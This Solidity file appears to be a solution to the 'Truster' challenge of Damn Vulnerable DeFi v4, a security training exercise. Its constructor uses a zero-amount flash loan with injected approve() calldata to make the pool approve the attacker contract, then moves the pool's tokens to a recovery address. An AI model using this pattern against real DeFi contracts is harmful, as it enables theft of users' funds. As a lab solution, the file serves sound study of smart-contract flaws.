// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import "./TrusterLenderPool.sol";

contract MaliciousReceiver {
    constructor(address pool, address token, address recovery, uint256 amount) {
        TrusterLenderPool(pool).flashLoan(
            0, address(this), token, abi.encodeWithSignature("approve(address,uint256)", address(this), amount)
        );
        DamnValuableToken(token).transferFrom(pool, recovery, amount);
    }
}
